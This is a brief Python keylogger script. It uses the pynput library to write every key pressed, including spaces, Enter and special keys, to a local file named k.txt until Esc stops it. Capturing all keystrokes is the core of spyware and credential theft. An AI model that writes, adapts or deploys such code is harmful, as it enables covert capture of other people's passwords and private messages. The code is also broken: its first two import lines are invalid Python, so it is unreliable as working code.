import __import__('pynput') as x
from x import keyboard
def log_key(key):
    try:
        with open('k.txt', 'a') as f:
            f.write(str(key.char))
    except AttributeError:
        if key == keyboard.Key.space:
            with open('k.txt', 'a') as f:
                f.write(' ')
        elif key == keyboard.Key.enter:
            with open('k.txt', 'a') as f:
                f.write('\n')
        else:
            with open('k.txt', 'a') as f:
                f.write(f'[{str(key).upper().replace('KEY.', '')}]')
def release_key(key):
    if key == keyboard.Key.esc:
        return False
with keyboard.Listener(on_press=log_key, on_release=release_key) as listener:
    try:
        listener.join()
    except Exception as e:
        print(f'An error occurred: {e}')